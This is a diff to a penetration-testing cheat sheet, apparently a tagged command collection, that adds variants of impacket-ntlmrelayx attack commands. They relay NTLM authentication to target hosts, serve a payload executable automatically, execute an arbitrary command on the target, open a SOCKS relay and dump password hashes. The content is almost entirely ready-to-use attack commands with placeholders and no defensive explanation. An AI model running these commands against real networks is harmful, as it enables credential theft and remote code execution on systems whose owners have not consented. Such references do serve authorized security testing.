@@ -16,20 +16,44 @@ impacket-smbserver <shareName> <sharePath>
 impacket-smbserver -username <username> -password <password> <shareName> <sharePath>
 ```
 
-## ntlmrelay - host a payload that will automatically be served to the remote host connecting
+## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 1
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 
 ```
 impacket-ntlmrelayx -tf <targets_file> -smb2support -e <payload_file|payload.exe>
 ```
 
-## ntlmrelay - socks
+## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 2
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+
+```
+impacket-ntlmrelayx -t <target> -smb2support -e <payload_file|payload.exe>
+```
+
+## ntlmrelay - execute command 
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<COMMAND>"
+```
+
+## ntlmrelay - socks option 1
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+impacket-ntlmrelayx -t <target> -socks -smb2support
+```
+
+## ntlmrelay - socks option 2
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 impacket-ntlmrelayx -tf <targets_file> -socks -smb2support
 ```
 
-## ntlmrelay - authenticate and dump hash
+## ntlmrelay - authenticate and dump hash option 1
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+impacket-ntlmrelayx -t <target> -smb2support
+```
+
+## ntlmrelay - authenticate and dump hash option 2
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 impacket-ntlmrelayx -tf <targets_file> -smb2support
